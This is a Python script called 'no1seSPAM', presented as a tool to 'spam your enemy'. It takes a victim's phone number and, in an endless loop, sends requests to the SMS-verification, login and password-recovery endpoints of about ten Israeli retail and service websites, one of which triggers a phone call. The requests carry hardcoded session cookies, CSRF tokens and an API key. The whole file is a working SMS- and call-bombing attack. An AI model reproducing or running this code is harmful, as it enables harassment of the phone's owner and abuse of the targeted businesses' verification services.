#Coded and made by no1se
import requests
import os
import platform
import time
from colorama import Fore, Back, Style, init




# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""


# Clear function like always
def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")




#My Amazing intro
def intro():
    clear()
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)    



def main_menu():
    while True:
        #Squidward
        clear()
        print("        .--'''''''''--.")
        print("     .'      .---.      '.")
        print("    /    .-----------.    \'")
        print("   /        .-----.        \'")
        print("   |       .-.   .-.       |")
        print("   |      /   \ /   \      |")
        print("    \    | .-. | .-. |    /")
        print("     '-._| | | | | | |_.-'")
        print("         | '-' | '-' |")
        print("          \___/ \___/")
        print("       _.-'  /   \  `-._")
        print("     .' _.--|     |--._ '.")
        print("     ' _...-|     |-..._ '")
        print("            |     |")
        print("            '.___.'")
        #Squidward
        print(Fore.RED+"Welcome to no1seSPAM - Spam your enemy.")
        print(Fore.LIGHTYELLOW_EX+"Please select an option:")
        print(f"{Fore.WHITE}1. Begin attacking a phone number.{Style.RESET_ALL}")
        print(f"{Fore.WHITE}2. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.LIGHTBLUE_EX}Enter your choice:{Fore.WHITE} ")

        if choice == "1":
            clear()
            print(f"{Fore.GREEN}Example: 0528371496")
            phone_num = input(f"{Fore.LIGHTYELLOW_EX}Type the phone number you want to attack: ")
            try:
                count = 0
                print(f"{Fore.RED}Press ctrl+c to stop the attack.")
                while True:
                    request1(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request2(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request3(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request4(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request5(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request6(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request7(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')


                    time.sleep(1)
                    request8(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    request9(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')

                    time.sleep(1)
                    phone_call(phone_num)
                    count += 1
                    print(f"{Fore.GREEN}Messages sent to {phone_num}: {count}", end='\r')
                    
            except KeyboardInterrupt:
                print(f"{Fore.RED}Attack stopped.")
                time.sleep(2)
                main_menu()
            exit(1)

        elif choice == "2":
            print(f"{Fore.LIGHTYELLOW_EX}Bye! :(")
            exit(1)
        else:
            print("")
            print(f"{Fore.RED}Please select a valid option!")
            time.sleep(2)



def request1(phone_num):
    if phone_num[:3] == "050":
        extension = "36"
    elif phone_num[:3] == "051":
        extension = "44"
    elif phone_num[:3] == "052":
        extension = "37"
    elif phone_num[:3] == "053":
        extension = "38"
    elif phone_num[:3] == "054":
        extension = "39"
    elif phone_num[:3] == "055":
        extension = "40"
    elif phone_num[:3] == "056":
        extension = "41"
    elif phone_num[:3] == "058":
        extension = "42"
    elif phone_num[:3] == "059":
        extension = "43"

    after_phone = phone_num[3:]   

    url = "https://www.braha.co.il/frontend/check_phone"
    headers = {
        "Cookie": "promo_modal=eyJpdiI6InVIRXl0a2FoOXVuU0RoMkpscFpCZlE9PSIsInZhbHVlIjoiUlRNV3RXLzk1dGlmUExRdldsOTBEOGtjMUd6TElPMFpDdnpmeDdOdGtHenZOazhIM1luYnR3RU12NWRNVExtMiIsIm1hYyI6ImZjYjQ3MzQ2MjI2MmY0OGJjODdkMzVkY2I4MGVhNzM3MmYzNWI0MTZhZTM4NzQ1MTAxNzVhZTVhMjllODgyYjIifQ%3D%3D; laravel_session=riVLVGZKEo1LoGllxvZJLbn9tZRpPlkuVOlzu8H6; _ga=GA1.1.492940928.1710097695; _fbp=fb.2.1710097695397.196197340; _ga_0JWTB406JX=GS1.1.1710097695.1.0.1710097711.44.0.0; XSRF-TOKEN=eyJpdiI6IkRyTjhySWVZTTlVS29kVEhSNWlOenc9PSIsInZhbHVlIjoic0FtVjZOd01YSEc5cVJ2bEltS1d3VDAxRmJNaTVISlJVdTBta0RLQ2ZoYkRFZ3hxWVZ6QU55MjI3dm9PcW1qdlY1K21zajljWm12VklPSEEwcU5XOWNhYm1yRGRRMVdNUm9SeUlraDlTa0k4QjdaWjFtRlNHMC9wQmZNWFhmdmwiLCJtYWMiOiJiZTBhZTY2MzA0ODJjMDQ0MmI5ZDQ1NDFkOTQyNmVlZTU1MzM2N2FjNTM4MmRhYzg4MWViOTk4ZDE4ZGRiYWYzIn0%3D",
        "Content-Length": "104",
        "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Origin": "https://www.braha.co.il",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.braha.co.il/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    data = {
        "login_message_type": "sms",
        "extension": f"{extension}",
        "phone_number": f"{after_phone}",
        "_token": "em2FD5StfArjjJFagRUmUINJ3FKcp018pgYVtcOR"
    }

    response = requests.post(url, headers=headers, data=data)

def request2(phone_num):
    url = 'https://trusty.co.il/api/auth/ask-for-auth-code'
    headers = {
        'Host': 'trusty.co.il',
        'Cookie': 'trustycoil_session=eyJpdiI6IjQvR2l5bXdlZmpuZFVEUzlLOElXWlE9PSIsInZhbHVlIjoiWlJsOVNYd2ZqWHRiV0RVZWVsY25NRWgxaWg5cTkwV2Z6cGV5VmxWaDR5U3ZRYmJWUndoSlVnZzNGRHdyOWVGVzBob3ZxZDRmcytKWS9vVWhqdENINjFtL2sxUVhod1FOVDc0OUhqa1pQRFRPOVg4U0RZbWN4RUJBNFNEOCtvc24iLCJtYWMiOiI2YmRlYjdlZTEwN2VhYWYyNWY3Y2ViZjk1N2VkYjdjYWE4ODU5ZmE3ZmZmMTFiMDZkOGM1ZDJkNTMxMDI2MjQ5IiwidGFnIjoiIn0%3D; _hjSessionUser_1347254=eyJpZCI6IjAzNDdlNzZmLTA3YzYtNWE0NS1iMmFlLTAxZmZhYTMxNWY5OCIsImNyZWF0ZWQiOjE3MTAxMDE0NTA5ODUsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1347254=eyJpZCI6IjViNzMyODk5LTQ0Y2EtNDQzMS1hMmIzLWY5NWU4ZDdlMmJjMSIsImMiOjE3MTAxMDE0NTA5ODYsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gcl_au=1.1.1357976017.1710101451; _fbp=fb.2.1710101451176.746911225; _gid=GA1.3.1254570502.1710101451; _gat_gtag_UA_126175979_1=1; _ga_WQKZWKH0M1=GS1.1.1710101451.1.0.1710101451.60.0.0; _ga=GA1.1.558680854.1710101451',
        'Content-Length': '63',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://trusty.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://trusty.co.il/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'phone': f'{phone_num}',
        'email': '',
        'process_name': 'normal_login'
    }

    response = requests.post(url, json=payload, headers=headers)


def request3(phone_num):
    url = 'https://server.myofer.co.il/api/sendAuthSms'
    headers = {
        'Content-Length': '28',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Appplatform': 'website',
        'Referrer': '',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://myofer.co.il',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'phoneNumber': f'{phone_num}'
    }

    response = requests.post(url, json=payload, headers=headers)


def request4(phone_num):
    url = 'https://friends.smarticket.co.il/iframe/api/customer/forgot_password'
    headers = {
        'Cookie': 'website_access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmcmllbmRzIiwiaWF0IjoxNzEwMTAyMzU4LCJqdGkiOiI2NWVlMTc1NjZiZmFlIiwiZXhwIjoxNzEwMTEzMTU4LCJDU1JGIjoiMjQ5ZDZiNmY0MmRiNzI2MTQwYzUyYjA2OTE0ZTYwNzQ1YWQwOTE3YTA1MzJmZTdkMzRlYzZiMjRkZGU0MmQ1OSJ9.cyIgM_zE3Ea46-CoQmc43D8NE4Vtwh-5XXArMjlaDCU; cookies_allowed=1',
        'Content-Length': '168',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'X-Csrf-Token': '249d6b6f42db726140c52b06914e60745ad0917a0532fe7d34ec6b24dde42d59',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://friends.smarticket.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://friends.smarticket.co.il/iframe/login?ref=/iframe/account/profile',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'CSRF-TOKEN': '249d6b6f42db726140c52b06914e60745ad0917a0532fe7d34ec6b24dde42d59',
        'ref': '/iframe/account/profile',
        'recovery_type': 'sms',
        'cellphone': f'{phone_num}',
        'temporary_password': ''
    }

    response = requests.post(url, data=payload, headers=headers)

def request5(phone_num):
    url = 'https://www.olsale.co.il/login/by-sms'
    headers = {
        'Cookie': 'olsale=eyJhbGciOiJIUzI1NiJ9.MDQ5Q0FBMzgtRjVBMC00OTc5LUIyNzEtRjlBMEE4NkMxNzgx.bWUwuHILFFhxEQO-kfNm89x9_xp803MzySDDPZPfePM; afid=j%3A%7B%22id%22%3A2005%2C%22date%22%3A%222024-03-10%2022%3A31%3A08%22%7D; sessionId=s%3AD6547032-F372-4F0B-A4DF-109A829BEB1A.JsQgjVDMZwutzIROs91JkZkHBjhTKJ8EhJIzIMY45lU; _tt_enable_cookie=1; _ttp=islmyiUU_RWR51HU806iBtoR6hO; _ga=GA1.1.1087645989.1710102671; _ga_3SD1JZD14T=GS1.1.1710102670.1.1.1710102673.57.0.0',
        'Content-Length': '69',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.olsale.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.olsale.co.il/login?ref=/profile',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'id': '',
        'phonenumber': f'{phone_num}',
        'digits': '',
        'status': 'send-code'
    }

    response = requests.post(url, json=payload, headers=headers)


def request6(phone_num):
    url = 'https://www.matnasata.org.il/page.php?type=logUser&ht=%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA%20%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA'

    headers = {
        'Host': 'www.matnasata.org.il',
        'Cookie': '_ga=GA1.3.1979404779.1710507792; _gid=GA1.3.1697816969.1710507792; PHPSESSID=fac6102ff2de3db529f762f1ba611b2f; _ga_KSSB003F14=GS1.3.1710540286.2.1.1710540327.0.0.0',
        'Content-Length': '92',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://www.matnasata.org.il',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://www.matnasata.org.il/page.php?type=logUser&ht=%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA%20%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=0, i'
    }

    payload = {
        'logPhone': f"{phone_num}",
        'send': '%D7%9B%D7%A0%D7%99%D7%A1%D7%94+%D7%9C%D7%9E%D7%A2%D7%A8%D7%9B%D7%AA'
    }

    response = requests.post(url, headers=headers, data=payload)

def request7(phone_num):
    url = 'https://www.azrielimalls.co.il/website_api/'

    headers = {
        'Host': 'www.azrielimalls.co.il',
        'Cookie': 'visid_incap_2556793=oXRsybuhR1aysbtVPbqnWDdE9GUAAAAAQUIPAAAAAAAW2QwTGaUo30kg9Utv/Cmg; _gid=GA1.3.1825303777.1710507066; _gcl_au=1.1.1415253312.1710507066; _fbp=fb.2.1710507066447.777485058; fort_uid=ab8e77c5-5ca3-486e-9e76-38f7bdec92ad; cms_fortvision_uid=ab8e77c5-5ca3-486e-9e76-38f7bdec92ad; PHPSESSID=udc54fa7f1docq7didn04vt3pk; nlbi_2556793=E8TqYd6eoEiy7sjIw+qUGQAAAAAwk1HTVd9eq0QjESTpjhhD; incap_ses_1255_2556793=G3C8Fy6xk3yUvLujLahqEczI9GUAAAAAehu77eH0QIy0ASMAAxTr1g==; _gat=1; dicbo_id=%7B%22dicbo_fetch%22%3A1710541008642%7D; _gat_UA-82468404-1=1; _ga_49H7E99GF2=GS1.1.1710541006.2.1.1710541034.32.0.0; _ga_E0D4BMCXG3=GS1.1.1710541007.2.1.1710541034.33.0.0; AWSALB=VDWP1h6sVpkTqKWQrObmX6XhCwQZ/3alqqXyxKZ7t0rSKOoAKc38YjWiTL6b8S5XeL9mmMJE2Sbzk3fmiRA856pYCYAjrBFYbKZT9Z6bfyn8iEWmXVWtZIxf7uKB; _ga=GA1.3.977148425.1710507066',
        'Content-Length': '60',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.azrielimalls.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.azrielimalls.co.il/%D7%94%D7%AA%D7%97%D7%91%D7%A8%D7%95%D7%AA',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    data = {
        'cellphone': f'{phone_num}',
        'action': '7dca3eaec010dd7ededa32cd00f121de'
    }

    response = requests.post(url, headers=headers, data=data)

def request8(phone_num):
    url = 'https://api.noyhasade.co.il/api/login?origin=web'

    headers = {
        'Host': 'api.noyhasade.co.il',
        'Cookie': '_gcl_au=1.1.650793337.1710541562; _ga=GA1.1.1607906144.1710541563; _hjSessionUser_2511419=eyJpZCI6IjdlNDE4MTg1LTUxYjAtNTg0Ny1iYjgwLWFjNzExMzVhYWQ2NyIsImNyZWF0ZWQiOjE3MTA1NDE1NjI2NzQsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2511419=eyJpZCI6IjZlZGQwN2U1LWM3YzQtNGMxYS1hYTAyLTcyMzJhYzg3NDEwNyIsImMiOjE3MTA1NDE1NjI2NzUsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; first_visit=1710541563; anonymous_id=7645:a44e467db3bb22117aba4b699c703f; flashy_attribution=["direct"]; _tt_enable_cookie=1; _ttp=QgZhJ79sP_4PHVXLR83JfbzulX0; _fbp=fb.2.1710541563045.1639489167; _ga_VSG3NVFSR2=GS1.1.1710541562.1.1.1710541578.44.0.0',
        'Content-Length': '36',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://noyhasade.co.il',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://noyhasade.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i',
        'Connection': 'close'
    }

    payload = {
        'phone': f'{phone_num}',
        'email': False
    }

    response = requests.post(url, headers=headers, json=payload)

def request9(phone_num):
    url = 'https://www.naamanp.co.il/customer/ajax/post/'

    headers = {
        'Host': 'www.naamanp.co.il',
        'Cookie': 'mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _hjSessionUser_1667449=eyJpZCI6IjRhM2VlNWU3LWJlMzktNWE0OC1iYmIxLWVkM2MzN2NlNWY3YSIsImNyZWF0ZWQiOjE3MTA1NDE4NzEzNzIsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_1667449=eyJpZCI6IjJiY2M1NWIwLTk0NjItNDViNy05MzMyLTQxNGU5YjRhNWY2OCIsImMiOjE3MTA1NDE4NzEzNzMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _ga_JD406ZCE1G=GS1.1.1710541871.1.0.1710541871.60.0.0; _ga=GA1.3.1022202961.1710541871; _gid=GA1.3.2031897565.1710541871; _gat_UA-126950163-1=1; _ga_0X19FQ29PL=GS1.3.1710541871.1.0.1710541871.0.0.0; glassix-visitor-id-v2-175fb6f6-0412-4f66-93d1-9ca363c92f62=5bd2f9db-0ed6-44c2-87ad-587118b37521; _fbp=fb.2.1710541872083.840953316; __za_cd_19763378=%7B%22visits%22%3A%22%5B1710541873%5D%22%2C%22campaigns_status%22%3A%7B%2289066%22%3A1710541873%7D%7D; __za_cds_19763378=%7B%22data_for_campaign%22%3A%7B%22country%22%3A%22IL%22%2C%22language%22%3A%22EN%22%2C%22ip%22%3A%22147.235.196.44%22%2C%22start_time%22%3A1710541871000%2C%22session_campaigns%22%3A%7B%2289066%22%3A%7B%22type%22%3A%22bubble%22%2C%22occur%22%3A1%7D%7D%7D%7D; __za_19763378=%7B%22sId%22%3A983016%2C%22dbwId%22%3A%221%22%2C%22sCode%22%3A%224f5ebc403c2cd5992011d2d1041a69c5%22%2C%22sInt%22%3A5000%2C%22na%22%3A1%2C%22td%22%3A0%2C%22ca%22%3A%221%22%7D; form_key=bvcr5Xu2YXGD3GM1; mage-messages=; private_content_version=e0297baf5f5d429b3ccff55272c2d44a; PHPSESSID=ph15l7ikk8tpbmfhmdcrrlh87a; store=naaman; store_id=2; X-Magento-Vary=1bd3935e6a548557a4064af43dbf35bbe02c330e; idus_mylist_init=ph15l7ikk8tpbmfhmdcrrlh87a; idus_popup_widget_newsletter_popup=true',
        'Content-Length': '113',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://www.naamanp.co.il',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.naamanp.co.il/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i'
    }

    payload = {
        'form_key': 'bvcr5Xu2YXGD3GM1',
        'bot_validation': '1',
        'type': 'login',
        'telephone': f'{phone_num}',
        'code': '',
        'compare_email': '',
        'compare_identity': ''
    }

    response = requests.post(url, headers=headers, data=payload)

def phone_call(phone_num):
    url = "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54"

    payload = {
        "phoneNumber": f"{phone_num}",
        "sourceFrom": "AuthJS",
        "isCalling": True,
        "sessionID": "f5d208a1-e5d0-83d0-157e-3e9968d44538"
    }

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Origin": "https://www.mishloha.co.il",
        "Referer": "https://www.mishloha.co.il/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Linux"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Priority": "u=1, i"
    }

    response = requests.post(url, json=payload, headers=headers)



intro()
main_menu()
#Coded and made by no1se